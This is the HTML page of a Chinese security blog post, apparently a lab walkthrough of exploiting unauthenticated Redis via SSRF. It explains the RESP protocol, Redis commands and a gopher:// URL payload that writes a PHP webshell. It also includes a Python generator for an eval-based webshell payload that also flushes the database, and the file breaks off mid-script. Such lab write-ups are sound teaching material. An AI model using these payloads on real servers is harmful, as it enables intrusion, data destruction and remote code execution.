@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="条件：能未授权或者能通过弱口令认证访问到Redis服务器 RESP协议 Redis序列化协议，是Redis数据库用于客户端与服务端之间通信的一种简单、高效且具有广泛适用性的协议。简单来说，就是客户端通过RESP协议发送命令给Redis服务器，服务器处理后通过RESP协议返回结果给客户端。  基本格式 简单字符串（Simple String）：以“+”开头，后面跟着一个字符串，用于表示状态信息或简单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf之未授权redis漏洞利用">
+<meta property="og:url" content="http://example.com/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="yeepie的小站">
+<meta property="og:description" content="条件：能未授权或者能通过弱口令认证访问到Redis服务器 RESP协议 Redis序列化协议，是Redis数据库用于客户端与服务端之间通信的一种简单、高效且具有广泛适用性的协议。简单来说，就是客户端通过RESP协议发送命令给Redis服务器，服务器处理后通过RESP协议返回结果给客户端。  基本格式 简单字符串（Simple String）：以“+”开头，后面跟着一个字符串，用于表示状态信息或简单">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="og:image" content="http://example.com/img/404.jpg">
+<meta property="article:published_time" content="2024-08-28T07:57:18.000Z">
+<meta property="article:modified_time" content="2024-08-28T09:17:31.508Z">
+<meta property="article:author" content="yeepie">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/404.jpg">
+
+
+<title >ssrf之未授权redis漏洞利用</title>
+
+<!-- Favicon -->
+
+    <link href='/log.svg?v=2.2.2' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/avatar.jpg?v=2.2.2' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/log.svg?v=2.2.2' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"yeepie","root":"/","typed_text":["Welcome to my blog"],"theme_version":"2.2.2","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"log.svg","icon16":"log.svg","icon32":"img/avatar.jpg","apple_touch_icon":"log.svg","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","show_text":"(/≧▽≦/)哟！被你找到了！","hide_text":"(●—●)猜猜我在哪儿？！"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"06/16/2024 12:00:00","prefix":"博客已运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"covers":["/img/1.jpg","/img/2.jpg","/img/3.jpg","/img/4.jpg","/img/5.jpg","/img/6.jpg","/img/7.jpg","/img/8.jpg","/img/9.jpg","/img/10.jpg","/img/11.jpg","/img/12.jpg","/img/13.jpg","/img/14.jpg","/img/15.jpg","/img/16.jpg","/img/17.jpg","/img/18.jpg","/img/19.jpg","/img/20.jpg","/img/22.jpg","/img/23.jpg","/img/24.jpg","/img/25.jpg","/img/26.jpg"]};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-08-28 17:17:31"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.2" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+     
+
+    
+
+    
+ 
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/log.svg">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/links/" target="">
+                    友链
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/about/" target="">
+                    关于
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner video cover -->
+    <video autoplay="autoplay" loop muted playsinline webkit-playinginline class="trm-banner-cover">
+        <source src="/img/1.mp4" type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"'>
+        Your browser does not support HTML5 video.
+    </video>
+    <!-- banner video cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            ssrf之未授权redis漏洞利用
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="http://yeepie.cn/img/avatar.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        yeepie
+    </h5>
+    
+        <div class="trm-label">
+            
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://music.163.com/#/user/home?id=1819240959" title="music" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-itunes-note"></i>
+        </a>
+    
+        <a href="http://yeepie.cn/img/qq.jpg" title="message" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-qq"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                RESIDENCE:
+            </div>
+            <div class="trm-label trm-label-light">
+                earth
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                AGE:
+            </div>
+            <div class="trm-label trm-label-light">
+                19
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                CITY:
+            </div>
+            <div class="trm-label trm-label-light">
+                西安
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            08/28
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            15:57
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            yeepie
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h1><p>能未授权或者能通过弱口令认证访问到Redis服务器</p>
+<h1 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h1><blockquote>
+<p>Redis序列化协议，是Redis数据库用于客户端与服务端之间通信的一种简单、高效且具有广泛适用性的协议。简单来说，就是客户端通过RESP协议发送命令给Redis服务器，服务器处理后通过RESP协议返回结果给客户端。</p>
+</blockquote>
+<h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><ol>
+<li><strong>简单字符串（Simple String）</strong>：以“+”开头，后面跟着一个字符串，用于表示状态信息或简单的文本回复，如“+OK\r\n”。</li>
+<li><strong>错误（Error）</strong>：以“-”开头，后面跟着一个错误信息字符串，用于表示命令执行过程中出现的错误，如“-ERR unknown command ‘set1’\r\n”。</li>
+<li><strong>整数（Integer）</strong>：以“:”开头，后面跟着一个整数，用于表示命令的返回结果是整数类型，如“:1\r\n”。</li>
+<li><strong>批量字符串（Bulk String）</strong>：以“$”开头，后面跟着一个数字表示字符串的长度，然后是字符串内容，最后以“\n˚”结尾。如果字符串不存在，则用“-1\r\n”表示。</li>
+<li><strong>数组（Array）</strong>：以“*”开头，后面跟着一个数字表示数组的长度，然后是数组中的元素，数组中的每个元素都是RESP协议支持的数据类型之一。数组用于表示多个值的集合，如命令的多个参数或命令的返回结果是多个值的集合。</li>
+</ol>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>redis命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> PING</span><br><span class="line">用来探测redis服务连通性</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> info</span><br><span class="line">查看redis服务的基础信息</span><br><span class="line">主要关注服务器版本，以及config文件存放位置</span><br><span class="line">redis_version</span><br><span class="line">config_file</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> select</span><br><span class="line">选择数据库，redis默认有<span class="number">16</span>个数据库，即<span class="number">0</span>-<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> get <span class="built_in">set</span></span><br><span class="line">在redis中使用get获取指定key的value值，然后使用<span class="built_in">set</span>来设置指定key的value值</span><br><span class="line"><span class="built_in">set</span> name pysnow</span><br><span class="line">get name</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> keys</span><br><span class="line">列出当前数据库指定的键名，*代表所有</span><br><span class="line">keys *</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> config</span><br><span class="line">配置命令，可以把配置理解为一个特殊的数据库</span><br><span class="line">config get *	获取config中的所有键和值</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">&quot;shell.php&quot;</span> 可以通过这个设置数据库存储的文件</span><br><span class="line">常用配置：</span><br><span class="line">dbfilename：数据库持久化文件名</span><br><span class="line"><span class="built_in">dir</span>：redis数据文件存储目录</span><br><span class="line">requirepass：密码</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> save</span><br><span class="line">保存数据</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> flushall</span><br><span class="line">清空数据</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>module load</span><br><span class="line">动态加载Reids模块</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>slaveof</span><br><span class="line">建立主从关系</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见ssrf攻击方式："><a href="#常见ssrf攻击方式：" class="headerlink" title="常见ssrf攻击方式："></a>常见ssrf攻击方式：</h1><ol>
+<li>绝对路径写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+</ol>
+<h2 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h2><p>构造redis命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.设置web路径</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">2.设置shell文件名</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">3.向数据库插入payload</span><br><span class="line">set payload &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">4.保存webshell</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="靶场历险记1"><a href="#靶场历险记1" class="headerlink" title="靶场历险记1"></a>靶场历险记1</h3><p><strong>靶场：</strong><a target="_blank" rel="noopener" href="https://github.com/mcc0624/SSRF"><strong>https://github.com/mcc0624/SSRF</strong></a><br>（换了无数次镜像源，终于拉取成功了）<br><strong>工具：wireshark&amp;tcpdump（kali自带）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>**接口和ip地址**
+<p><strong>使用dict协议探测内网主机，利用burp爆破D段</strong></p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>**dict://172.250.250.9:6379/info 可以查看redis版本信息**
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>**docker ps查看未授权redis容器的id**
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>**docker exec -it 01 bash  连接**
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>到网站根目录，此时只有一个index.php文件<br><strong>tcpdump抓取redis-cli的包</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i  br-be9a386f1572 tcp and port 6379 -w redis.pcapng</span><br></pre></td></tr></table></figure>
+
+<p>输入上述redis命令</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/9.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>结束抓包，用wireshark打开redis.pcapng<br>追踪流-&gt;tcp</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/10.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>抓到的数据如下：
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/11.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p><strong>构造gopher协议</strong><br>根据规则进行替换和编码（注意？）notepad</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/12.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">url=gopher://172.250.250.9:6379/_*4%250d%250A%246%250d%250Aconfig%250d%250A%243%250d%250Aset%250d%250A%243%250d%250Adir%250d%250A%2414%250d%250A%2Fvar%2Fwww%2Fhtml%2F%250d%250A*4%250d%250A%246%250d%250Aconfig%250d%250A%243%250d%250Aset%250d%250A%2410%250d%250Adbfilename%250d%250A%249%250d%250Ashell.php%250d%250A*3%250d%250A%243%250d%250Aset%250d%250A%247%250d%250Apayload%250d%250A%2418%250d%250A%3C%253Fphp%20phpinfo()%3B%253F%3E%250d%250A*1%250d%250A%244%250d%250Asave%250d%250A*1%250d%250A%244%250d%250Aquit   (进行二次编码)</span><br></pre></td></tr></table></figure>
+
+<p>之后再访问</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=[http://172.250.250.9/shell.php](http://172.250.250.9/shell.php)</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/13.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>成功写入
+
+<h3 id="利用gopherus生成payload"><a href="#利用gopherus生成payload" class="headerlink" title="利用gopherus生成payload"></a>利用gopherus生成payload</h3><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/14.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>内容是一句话木马
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/15.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>_后面还要再一次url编码，成功后访问shell.php<br>post传参即可</p>
+<h3 id="构造gopher协议脚本"><a href="#构造gopher协议脚本" class="headerlink" title="构造gopher协议脚本"></a><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/16.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>构造gopher协议脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span>        <span class="comment">#如果无密码就不加，如果有密码就加 </span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span 